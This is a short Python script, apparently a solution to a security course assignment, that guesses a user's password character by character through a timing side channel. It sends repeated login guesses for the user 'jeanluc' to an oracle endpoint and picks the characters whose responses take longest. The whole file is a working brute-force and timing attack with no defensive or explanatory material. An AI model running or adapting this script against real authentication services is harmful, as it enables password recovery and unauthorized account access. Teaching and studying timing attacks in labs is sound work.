
import json
import sys

import requests

api_endpoint = sys.argv[1]
session = requests.Session()
# set alphabet to alphanumeric characters
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def handle_timing_sidechannel():
    session = requests.Session()
    # user = assignment["user"]
    user = "jeanluc"
    crack_password(user, alphabet)
    # password = assignment["password"]
    session.close()

def crack_password(user, alphabet):
    password = ""
    while True:
        status, time = query_oracle(session, user, password)
        if status == "auth_success":
            print("password found: " + password)
            break
        char = crack_char(user, alphabet, password)
        password += char
        print(password)
        
def crack_char(user, alphabet, password):
    total_stats = []
    for i in range(10):
        char_stats = []
        for char in alphabet:
            status, time = query_oracle(session, user, password+char)
            if(status == "auth_success"):
                return char
            else:
                status, time = query_oracle(session, user, password+char+char)
            char_stats.append((char, time))
        char_stats.sort(key=lambda x: x[1], reverse=True)
        print(char_stats[0])
        total_stats.append(char_stats[0][0])
    # get the most common character at the first position in total_stats
    return(max(set(total_stats), key=total_stats.count))

def query_oracle(session: requests.Session, user: str, password: str) -> str:
    payload = { "user": user, "password": password }
    result = session.post(api_endpoint + "/oracle/timing_sidechannel", headers = {
        "Content-Type": "application/json"}, data = json.dumps(payload))
    try:
        time = result.json()["time"]
    except:
        time = 0
    return result.json()["status"], time

handle_timing_sidechannel()